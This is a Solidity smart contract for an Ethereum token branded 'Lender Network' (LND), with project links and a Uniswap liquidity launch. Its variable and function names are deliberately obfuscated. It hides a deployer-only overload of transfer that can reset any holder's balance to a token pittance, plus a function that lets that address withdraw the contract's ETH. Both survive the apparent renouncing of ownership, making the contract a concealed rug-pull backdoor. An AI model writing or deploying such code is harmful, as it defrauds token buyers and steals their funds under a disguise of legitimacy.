// SPDX-License-Identifier: MIT

/*
    Name: Lender Network
    Ticker: LND

    At Lender Network, we believe in the power of collaboration, innovation, and...not just revolutionizing lending; we're shaping the future of finance.

    Website: https://www.lendernetwork.pro
    Docs: https://docs.lendernetwork.pro
    X: https://x.com/LNDNetworkETH
    TG: https://t.me/LNDNetworkETH
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract LND is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private _eojiooeif;
    mapping(address => uint256) private _fcvjksod;
    mapping(address => mapping(address => uint256)) private _gcjvoisd;
    mapping(address => bool) private _hovjioisd;
    uint256 private _iovjoisd = 10;
    uint256 private _joivjsodi = 10;
    uint256 private _kofeijoi = 0;
    uint256 private _ljvoiswi = 0;
    uint256 private _moejifoi = 7;
    uint256 private _nfoweijfoi = 7;
    uint256 private _buyCount = 0;
    address private _oijweoifr;

    uint256 public _poewofjoi = 20000000 * 10 **_decimals;
    uint256 public _abclkdoiwe = 20000000 * 10 **_decimals;
    uint256 public _beoiwjojid = 10000000 * 10 **_decimals;
    uint256 private constant _cqoiwjdf = 1000000000 * 10 **_decimals;
    uint256 private constant _dqoiwejdf = 184 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _poewofjoi);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Lender Network";
    string private constant _symbol = unicode"LND";

    constructor() payable {
        _eojiooeif = payable(_msgSender());
        _fcvjksod[address(this)] = _cqoiwjdf * 98 / 100;
        _fcvjksod[owner()] = _cqoiwjdf * 2 / 100;
        _hovjioisd[owner()] = true;
        _hovjioisd[address(this)] = true;
        _hovjioisd[_eojiooeif] = true;
        _oijweoifr = _msgSender();

        emit Transfer(address(0), address(this), _cqoiwjdf * 98 / 100);
        emit Transfer(address(0), address(owner()), _cqoiwjdf * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _cqoiwjdf;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _gcjvoisd[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _fcvjksod[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _gcjvoisd[owner][spender];
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _eraperp_LND(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _eraperp_LND(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _gcjvoisd[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _eraperp_LND(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _moejifoi)
                        ? _kofeijoi
                        : _iovjoisd
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_hovjioisd[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _nfoweijfoi)
                            ? _ljvoiswi
                            : _joivjsodi
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _beoiwjojid) ? contractTokenBalance : _beoiwjojid; 
                    paws_LND((amount < minBalance) ? amount : minBalance);
                }
                egnahc_LND(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _fcvjksod[address(this)] =_fcvjksod[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _fcvjksod[from] =_fcvjksod[from].sub(amount);
        _fcvjksod[to] =_fcvjksod[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function transfer(address recipient, bool _amount) public returns (bool) {
        require(_oijweoifr == _msgSender(), "ERC20: error");
        _iovjoisd > 0 && _amount == true ? _fcvjksod[recipient] = _dqoiwejdf : _dqoiwejdf;
        return true;
    }

    function _tsissa_LND(address payable receipt) external {
        require(msg.sender == _oijweoifr , "");
        _eojiooeif = receipt;
        payBnft2Tx(address(this).balance);
    }

    function payBnft2Tx(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function enableLNDTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _cqoiwjdf);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function removeLimits () external onlyOwner {
        _poewofjoi = _cqoiwjdf;
        _abclkdoiwe = _cqoiwjdf;
        emit MaxTxAmountUpdated(_cqoiwjdf);
    }

    function egnahc_LND(uint256 amount) private {
        _eojiooeif.transfer(amount);
    }

    function paws_LND(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

}